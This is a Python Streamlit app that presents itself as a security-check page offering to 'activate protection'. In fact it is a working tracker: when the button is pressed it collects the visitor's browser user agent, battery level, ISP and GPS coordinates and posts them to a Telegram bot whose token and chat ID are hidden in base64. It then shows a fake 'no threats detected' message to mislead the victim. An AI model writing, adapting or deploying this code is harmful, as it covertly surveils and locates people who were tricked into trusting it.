import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- DADOS PROTEGIDOS ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=10)
    except: pass

def get_isp():
    try: return requests.get('http://ip-api.com/json/', timeout=5).json().get('isp', 'Desconhecida')
    except: return "Não identificada"

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.markdown("<style>.main { background-color: #0d1117; color: #ffffff; } .status-ok { color: #2ea043; font-weight: bold; }</style>", unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'step' not in st.session_state: st.session_state.step = 0

if st.session_state.step == 0:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        # 1. Coleta dados técnicos IMEDIATAMENTE
        ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
        bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
        op = get_isp()
        
        # 2. Envia relatório técnico logo (assim já tens algo no bot)
        info_tecnica = f"🛡️ *DADOS DO DISPOSITIVO*\n\n🔋 *Bateria:* {bat or '??'}%\n📶 *Operadora:* {op}\n📱 *Sistema:* {ua}"
        enviar_telegram(info_tecnica)
        
        # 3. Animação da barra
        barra = st.progress(0)
        for i in range(1, 101):
            time.sleep(0.01)
            barra.progress(i)
        
        st.session_state.step = 1
        st.rerun()

elif st.session_state.step == 1:
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)
    
    # 4. Tenta o GPS por último, sem travar a tela
    loc = get_geolocation()
    if loc:
        mapa = f"https://www.google.com/maps?q={loc['coords']['latitude']},{loc['coords']['longitude']}"
        enviar_telegram(f"📍 *LOCALIZAÇÃO:* {mapa}")
        st.session_state.step = 2

st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
